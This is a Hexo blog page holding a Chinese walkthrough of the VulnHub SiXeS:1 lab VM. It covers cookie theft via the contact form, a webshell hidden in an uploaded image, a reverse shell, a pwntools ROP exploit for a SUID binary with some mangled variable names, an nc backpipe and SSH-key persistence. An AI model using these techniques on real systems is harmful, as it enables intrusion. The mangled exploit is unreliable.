@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tit.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tit.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tit.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="靶机环境10-24 获得所有flag（6/6）10-20 暂未取得所有flag（4/6）官网链接：https://www.vulnhub.com/entry/sixes-1,380/下载地址：https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova">
+<meta name="keywords" content="VulnHub,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnHub_SiXeS_1">
+<meta property="og:url" content="http://yoursite.com/2019/10/20/vulnHub-SiXeS-1/index.html">
+<meta property="og:site_name" content="SERN">
+<meta property="og:description" content="靶机环境10-24 获得所有flag（6/6）10-20 暂未取得所有flag（4/6）官网链接：https://www.vulnhub.com/entry/sixes-1,380/下载地址：https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/4cIo9bnPeLUYQKS.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/ChMQP8IHmkJrSdR.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/z9Frk1VsKlJ8Eb7.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/Z3CvLHatbXRxjFV.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/xVwXn1JsD9Eg3Ta.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/mZjsuVI7Fbg6qly.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/LEvdO1RrU95aNyz.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/UxAklcYSZCzwiEv.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/lVgDGufXq7L8oSd.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/BYnfC25D1qXtwMH.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/ITnk7uVBYsgrCPZ.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/ZL7eA49bRVCPcDn.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/24/AHvewRZP6rKtciz.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/24/TM5GeOqiswzU2hL.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/24/t74NHJXY3kgMT6d.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/jSB4FxRyJGVhWrH.png">
+<meta property="og:updated_time" content="2020-02-13T03:09:22.547Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnHub_SiXeS_1">
+<meta name="twitter:description" content="靶机环境10-24 获得所有flag（6/6）10-20 暂未取得所有flag（4/6）官网链接：https://www.vulnhub.com/entry/sixes-1,380/下载地址：https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/20/4cIo9bnPeLUYQKS.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/20/vulnHub-SiXeS-1/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>vulnHub_SiXeS_1 | SERN</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?810c939467f41f3d42f800dd396fe6b5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion .logo-line-before i { left: initial; }
+    .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SERN</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/20/vulnHub-SiXeS-1/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Amadeus">
+      <meta itemprop="description" content="Security Edge Research Net，一个misc选手存放日志的地方">
+      <meta itemprop="image" content="https://i.loli.net/2018/12/22/5c1db6b0a0ab4.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SERN">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">vulnHub_SiXeS_1
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-20 18:40:53" itemprop="dateCreated datePublished" datetime="2019-10-20T18:40:53+08:00">2019-10-20</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-02-13 11:09:22" itemprop="dateModified" datetime="2020-02-13T11:09:22+08:00">2020-02-13</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/10/20/vulnHub-SiXeS-1/" class="leancloud_visitors" data-flag-title="vulnHub_SiXeS_1">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h1><h2 id="10-24-获得所有flag（6-6）"><a href="#10-24-获得所有flag（6-6）" class="headerlink" title="10-24 获得所有flag（6/6）"></a>10-24 获得所有flag（6/6）</h2><h2 id="10-20-暂未取得所有flag（4-6）"><a href="#10-20-暂未取得所有flag（4-6）" class="headerlink" title="10-20 暂未取得所有flag（4/6）"></a>10-20 暂未取得所有flag（4/6）</h2><p>官网链接：<a href="https://www.vulnhub.com/entry/sixes-1,380/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/sixes-1,380/</a><br>下载地址：<a href="https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova" target="_blank" rel="noopener">https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova</a><br><a id="more"></a></p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>目标在192.168.56.116上线<br><img src="https://i.loli.net/2019/10/20/4cIo9bnPeLUYQKS.png" alt=""><br>nmap走一轮<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 19:02 CST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.116</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-r--r--r--    1 0        0             233 Oct 03 20:44 note.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.101</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 4</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 b2:b1:45:a2:01:2b:10:7e:01:04:c3:5d:4d:43:5d:4d (RSA)</span><br><span class="line">|   256 c2:c3:e2:fa:37:97:b7:32:1a:9d:43:96:f1:72:01:e3 (ECDSA)</span><br><span class="line">|_  256 a9:87:18:d6:a3:a1:ad:7e:85:d0:3f:cf:d7:bd:49:c9 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: SiXeS - Making Team Fortress 2 great again</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure></p>
+<p>目标开放21，22，80端口，并且21端口的ftp还是存在匿名登录。</p>
+<h1 id="进行渗透"><a href="#进行渗透" class="headerlink" title="进行渗透"></a>进行渗透</h1><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>匿名登录进去get一下note，第一个flag到手<br><img src="https://i.loli.net/2019/10/20/ChMQP8IHmkJrSdR.png" alt=""></p>
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>一个web服务<br><img src="https://i.loli.net/2019/10/20/z9Frk1VsKlJ8Eb7.png" alt=""><br>主页上有一个管理员登录的入口，需要用户名密码。<br>还有contact.php页面可以给网站留言<br><img src="https://i.loli.net/2019/10/20/Z3CvLHatbXRxjFV.png" alt=""><br>用nc打开本机的某个端口接受连接，同时把自己的ip和端口号交上去。远端会用url开头的协议与你通信。<br><img src="https://i.loli.net/2019/10/20/xVwXn1JsD9Eg3Ta.png" alt=""><br>收到通信流量后会发现cookie也带过来了。<br>下一步修改cookie，访问admin.php就可以看到管理后台。同时页面也给出第二个flag<br><img src="https://i.loli.net/2019/10/20/mZjsuVI7Fbg6qly.png" alt=""></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>只允许上传图片格式的文件。但是并不是对文件后缀进行检查，而是直接看文件头。随便找一个图片文件，在末尾追加一句话木马，改名成a.php上传。<br>上传位置可以通过复制网站中其他图片的位置得到，在/img/目录下。<br><img src="https://i.loli.net/2019/10/20/LEvdO1RrU95aNyz.png" alt=""><br>之后写入反弹shell，传入meterpreter生成的shell木马就可以获得一个meterpreter环境。（msf真的香）<br><img src="https://i.loli.net/2019/10/20/UxAklcYSZCzwiEv.png" alt=""><br>之后进入/home文件夹，拿到第三个flag<br><img src="https://i.loli.net/2019/10/20/lVgDGufXq7L8oSd.png" alt=""><br>在config.php里面有sql数据库的明文密码和用户，使用这个登录数据库。<br><img src="https://i.loli.net/2019/10/20/BYnfC25D1qXtwMH.png" alt=""><br>之前生成的shell无法交互式的输入密码，这里再用python生成一个。由于远端的python需要用python3来调用，需要一点小小的修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
+<p>之后得到数据库<br><img src="https://i.loli.net/2019/10/20/ITnk7uVBYsgrCPZ.png" alt=""><br>使用sixes数据库，里面放着第四个flag<br><img src="https://i.loli.net/2019/10/20/ZL7eA49bRVCPcDn.png" alt=""></p>
+<h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><h2 id="普通用户权限"><a href="#普通用户权限" class="headerlink" title="普通用户权限"></a>普通用户权限</h2><p>问了下国外的一个老哥，他给了我一个信息搜集的脚本，可以一键搜集当前服务器上的敏感信息：<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[00;31m[-] SUID files:[00m</span><br><span class="line">-rwsr-xr-x 1 root root 40152 May 15 21:43 /snap/core/7713/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 May 15 21:43 /snap/core/7713/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jun 10 23:53 /snap/core/7713/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 20:46 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-sr-x 1 root root 106696 Aug 30 08:09 /snap/core/7713/usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd</span><br><span class="line">-rwsr-xr-x 1 root root 40152 Aug 23 12:28 /snap/core/7917/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7917/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7917/bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7917/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 Aug 23 12:28 /snap/core/7917/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jun 10 23:53 /snap/core/7917/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 20:46 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-sr-x 1 root root 106696 Oct  1 10:55 /snap/core/7917/usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28 12:05 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap</span><br><span class="line">-rwsr-xr-x 1 root root 18448 Jun 28 12:05 /usr/bin/traceroute6.iputils</span><br><span class="line">-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jun 10 19:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">-r-sr-xr-x 1 root root 243896 Sep 20 10:35 /usr/lib/chromium-browser/chrome-sandbox</span><br><span class="line">-rwsr-sr-x 1 root root 105336 Jun  5 07:41 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-r-sr-sr-x 1 webmaster webmaster 17320 Oct  3 20:24 /sbin/notemaker</span><br></pre></td></tr></table></figure></p>
+<p>可以看到suid文件里最后有一个属于webmaster的程序，除nx外没有其他防护，拉回本地进行分析。用无敌的ida看一眼，可以发现有一个大洞。<br><img src="https://i.loli.net/2019/10/24/AHvewRZP6rKtciz.png" alt=""><br>栈溢出直接写ropchain，泄露libc基址，然后ret回system搞定。<br>这里贴上我的exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">if</span>(len(sys.argv)<span class="number">-1</span>):</span><br><span class="line">truep=remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">truelibc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">truep=process(<span class="string">"./notemaker"</span>)</span><br><span class="line">truelibc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">offset=<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">'a'</span>*offset</span><br><span class="line">poprdi=<span class="number">0x00000000004014eb</span></span><br><span class="line">poprsir15=<span class="number">0x00000000004014e9</span></span><br><span class="line">elf=ELF(<span class="string">'./notemaker'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401222</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'bp 0x40136e'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">a=p.recvline()[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">libc_base=u64(a.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,'bp 0x40136e')</span></span><br><span class="line">sh_addr=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'a'</span>*offset</span><br><span class="line">payload+=p64(<span class="number">0x000000000040136F</span>)<span class="comment"># ret</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0x401222</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>需要注意一点是在Ubuntu下进行函数调用时的栈是16位对齐的，也就是说栈顶地址务必是0x……0的形式，在这里卡了一下午，多亏@0x000c0ded的提醒。<br>通了以后就可以利用<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p </span><br><span class="line">notemaker 0&lt;/tmp/backpipe | nc -lp 4430 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure></p>
+<p>把程序挂出来，这两行命令可以规避nc -e不存在的问题。<br>之后打通就是普通用户权限</p>
+<h2 id="普通用户持久化"><a href="#普通用户持久化" class="headerlink" title="普通用户持久化"></a>普通用户持久化</h2><p>在~/下新建.ssh文件夹，把本机的ssh pub key放到里面的authorized_keys，之后就可以本机ssh免密登录靶机。</p>
